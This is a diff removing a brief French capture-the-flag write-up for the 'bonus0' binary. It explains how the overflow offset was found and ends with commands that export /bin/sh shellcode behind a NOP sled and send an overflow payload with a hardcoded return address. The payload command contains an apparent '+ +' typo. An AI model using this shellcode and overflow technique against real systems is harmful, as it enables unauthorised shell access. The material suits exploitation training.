@@ -1,9 +1,0 @@
-Nous devons trouver l'offset en premier lieu.
-Nous voyons qu'il y a deux puts donc nous lancons le binaire et essaysons en mettant un bon nombre de caractere dans les deux.
-Nous voyons un segfault, donc il faut savoir lequel. Nous testons et nous nous apercevons que c'est le deuxieme qui segfault.
-En analysans sous gdb, nous nous apercevons qu'il y a un strchr qui cherche un \n. Du coup, nous remplissons le premier tableau au maximum avec un \n a la fin.
-Puis nous exportons un shellcode et nous lancons. Nous voyons que rien ne se passe. Pas un segfault, donc nous allons remplir le deuxieme tableau afin de segfault et que le shell se lance.
-
-export SHELLCODE=`python -c 'print "\x90" * 250 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`
-python -c 'print "A" * 4095 + "\n" + + "B" * 9 + "\x6c\xf8\xff\xbf" + "C" * 30' > /tmp/jackpot
-cat /tmp/jackpot - | ./bonus0
